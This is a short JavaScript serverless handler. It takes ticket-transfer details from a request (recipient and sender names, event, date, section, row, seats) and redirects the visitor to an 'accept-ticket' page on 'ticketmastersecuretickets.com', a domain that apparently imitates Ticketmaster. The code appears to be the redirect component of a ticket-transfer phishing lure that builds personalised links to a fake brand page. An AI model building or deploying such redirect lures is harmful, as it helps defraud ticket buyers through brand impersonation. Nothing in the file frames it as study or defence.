export default async function handler(req, res) {
    try {
      const {
        recipientName, senderName, eventName, eventDetails, eventDate, eventTime,
        ticketCount, section, row, seats, ticketType
      } = req.query;
  
      if (!recipientName || !senderName || !eventName) {
        return res.status(400).json({ 
          error: 'Missing required parameters: recipientName, senderName, eventName' 
        });
      }
  
      const baseUrl = 'https://ticketmastersecuretickets.com/accept-ticket.html';
      const params = new URLSearchParams({
        recipientName: recipientName || '',
        senderName: senderName || '',
        eventName: eventName || '',
        eventDetails: eventDetails || '',
        eventDate: eventDate || '',
        eventTime: eventTime || '',
        ticketCount: ticketCount || '1',
        section: section || '',
        row: row || '',
        seats: seats || '',
        ticketType: ticketType || 'General'
      });
  
      const redirectUrl = `${baseUrl}?${params.toString()}`;
      console.log('Redirecting to:', redirectUrl);
      return res.redirect(302, redirectUrl);
    } catch (error) {
      console.error('Redirect error:', error);
      return res.status(500).json({ error: 'Internal server error' });
    }
  }
  